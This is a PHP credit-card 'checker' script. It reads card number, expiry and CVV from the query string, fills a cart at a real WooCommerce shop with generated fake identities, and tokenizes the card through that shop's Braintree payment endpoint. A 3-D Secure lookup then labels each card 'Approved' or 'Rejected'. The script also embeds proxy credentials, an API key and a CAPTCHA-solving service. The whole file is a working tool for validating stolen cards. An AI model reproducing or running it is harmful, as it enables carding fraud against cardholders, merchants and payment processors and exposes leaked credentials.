<?php
    error_reporting(0);
    $time_start = microtime(true);
    set_time_limit(200);
    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 16)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
   function cURLc($url, $headers, $postfields, $customrequest) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            // CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            // CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            // CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
    function cURL($url, $headers, $postfields, $customrequest, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
     function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.render=true.ultra_premium=true:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            // CURLOPT_SSL_VERIFYPEER => 0, 
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
            CURLOPT_PROXYUSERPWD => 'radr25547ocrv61808:oe0fnaIAN7igUGuK', 
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

     function cURLc_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.render=true.ultra_premium=true:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            // CURLOPT_SSL_VERIFYPEER => 0, 
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
            CURLOPT_PROXYUSERPWD => 'radr25547ocrv61808:oe0fnaIAN7igUGuK', 
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $ccbin = substr($cc, 0,6);
    $mm = $separator[1];
    $m = ltrim($mm,"0");
    $yy = $separator[2];
    $yy1 = substr($yy, 2,2);
    $cvv = $separator[3];
    $cookie = RandomString();
    $cbin = substr($cc, 0,1);
    
    if($cbin == 5){ 
    $cbin = 'masterCard'; 
    } 
    else if($cbin == 4){ 
    $cbin = 'visa'; 
    } 

function solveCaptcha($site,$siteKey,$clientKey){
$createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
               "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"RecaptchaV3TaskProxyless",
        "websiteURL":"'.$site.'",
        "websiteKey":"'.$siteKey.'",
        "minScore": 0.3,
        "pageAction": "userverify"}}',
        "POST"
    );
 $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
 $status = "processing";
 $gResponse = "";
  while ($status == "processing") {
    sleep(3);
    $getTaskResult =  cURLc(
        "https://api.capmonster.cloud/getTaskResult ",
        $headers = [
                "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
        "POST"
    );
 $status = getstr($getTaskResult,'"status":"','"');
 $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
return $getTaskResult ;
}
  

    $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://binov.net/",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_HEADER => 1,
            CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
            ],
            CURLOPT_POSTFIELDS => "BIN=$ccbin"
        ));
        $g_ccdets = curl_exec($ch);
        //$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
        $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
        $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
        $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
        $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
        $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
        // $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
        $CC_fDets = "Bank: $cc_bname Country: $cc_country";
    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = GetStr($local, "$state" , '"');




                $ajax =  cURL(
                    "https://hebtro.co/?wc-ajax=add_to_cart",
                    $headers = [
                        "Accept: application/json, text/javascript, */*; q=0.01",
                        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                        "x-requested-with: XMLHttpRequest",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
                    ],
                    'product_sku=dbad-keystrap&quantity=1&product_name=DBAD+Keystrap&product_id=40299',
                    "POST",
                    $cookie
                );


              $checkout =    cURL(
                    "https://hebtro.co/checkout/",
                    $headers = [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "referer: https://hebtro.co/cart/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
                    ],
                    '',
                    "GET",
                    $cookie
                );
                $wp_nonce = GetStr($checkout, 'name="woocommerce-process-checkout-nonce" value="','"');
                  $data = json_decode(base64_decode(GetStr($checkout, 'wc_braintree_client_token=["','"')),true);
                 $fprint = $data['authorizationFingerprint'];
                 $clientId = $data['paypal']['clientId'];
                 $braintreeClientId = $data['paypal']['braintreeClientId'];

                   
                $graphql = cURL(
                    "https://payments.braintree-api.com/graphql",
                    $headers = [
                        "Accept: */*",
                        "Authorization: Bearer $fprint",
                        "Braintree-Version: 2018-05-10",
                        "Content-Type: application/json",
                        "Origin: https://assets.braintreegateway.com",
                        "Referer: https://assets.braintreegateway.com/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
                    ],
                    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$str.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90012","streetAddress":"Central Ave"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
                    "POST",
                    $cookie
                ); 
                 $token = GetStr($graphql, '"token":"','"');



                 $lookup = cURL(
                    "https://api.braintreegateway.com/merchants/stz9jwvj9rb43k5h/client_api/v1/payment_methods/$token/three_d_secure/lookup",
                    $headers = [
                        "Accept: */*",
                        "Content-Type: application/json",
                        "Referer: https://hebtro.co/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
                    ],
                    '{"amount":"36.67","additionalInfo":{"shippingGivenName":"July","shippingSurname":"Kalat","billingLine1":"Central Ave","billingLine2":"dsadas","billingCity":"Los Angeles","billingState":"CA","billingPostalCode":"90001","billingCountryCode":"US","billingPhoneNumber":"12125123412","billingGivenName":"July","billingSurname":"Kalat","shippingLine1":"Central Ave","shippingLine2":"dsadas","shippingCity":"Los Angeles","shippingState":"CA","shippingPostalCode":"90001","shippingCountryCode":"US","email":"'.$email.'"},"bin":"'.$ccbin.'","dfReferenceId":"'.$str.'","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.3","cardinalDeviceDataCollectionTimeElapsed":1517,"issuerDeviceDataCollectionTimeElapsed":16021,"issuerDeviceDataCollectionResult":false},"authorizationFingerprint":"'.$fprint.'","braintreeLibraryVersion":"braintree/web/3.85.3","_meta":{"merchantAppId":"hebtro.co","platform":"web","sdkVersion":"3.85.3","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$str.'"}}',
                    "POST",
                    $cookie
                ); 
                $status = GetStr($lookup, '"status":"','"');
                $res_type = array("lookup_not_enrolled", "authenticate_successful", "authenticate_attempt_successful", "authentication_unavailable");
          
        if(in_array($status, $res_type)) {
            $resp = array('message' => 'Approved', 'responsecode' => $status, 'amount' => '1');
             echo $r = json_encode($resp);
         }elseif($status == null || $status == ""){
            $resp = array('message' => 'Website Error', 'responsecode' => $status, 'amount' => '1');
            echo  $r = json_encode($resp);
        }
         else{
            $resp = array('message' => 'Rejected', 'responsecode' => $status, 'amount' => '1');
            echo  $r = json_encode($resp);
        }
   
   unlink("cookies/$cookie.txt");


?>